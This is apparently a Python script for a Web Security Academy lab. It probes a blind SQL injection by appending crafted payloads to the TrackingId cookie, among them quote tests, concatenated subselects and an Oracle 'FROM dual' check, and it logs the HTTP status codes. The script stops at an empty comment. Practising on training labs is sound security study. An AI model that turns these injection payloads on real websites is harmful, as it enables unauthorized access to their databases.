import requests
import difflib
import string
from tqdm import tqdm
import concurrent.futures

# Define the base URL
url = 'https://0a7c00e8047db3b3808e122c0094003f.web-security-academy.net'

def web_request(s, query):
    cookies['TrackingId'] = tracking_id + query
    response = s.get(url=url, cookies=cookies)
    return response

# Start a session
with requests.Session() as s:
    # Initial request to get cookies
    r = s.get(url)
    
    # Extract the cookies
    tracking_id = ''
    session_id = ''
    for cookie in r.cookies:
        if cookie.name == 'TrackingId':
            tracking_id = cookie.value
        elif cookie.name == 'session':
            session_id = cookie.value

    # Debug: Print the initial cookies
    print(f'Initial TrackingId: {tracking_id}')
    print(f'Initial session: {session_id}')

    cookies = {
        'TrackingId': tracking_id,
        'session': session_id
    }
    # Error query
    query = "'"
    response = web_request(s,query)
    print(f"{query=} : {response.status_code}")

    # No error
    query = "''"
    response = web_request(s,query)
    print(f"{query=} : {response.status_code}")

    # Server interpreting SQL check
    query = "'||(SELECT '')||'"
    response = web_request(s,query)
    print(f"{query=} : {response.status_code}")

    query = "'||(SELECT '' FROM dual)||'"
    response = web_request(s,query)
    print(f"{query=} : {response.status_code}")
    
    # 
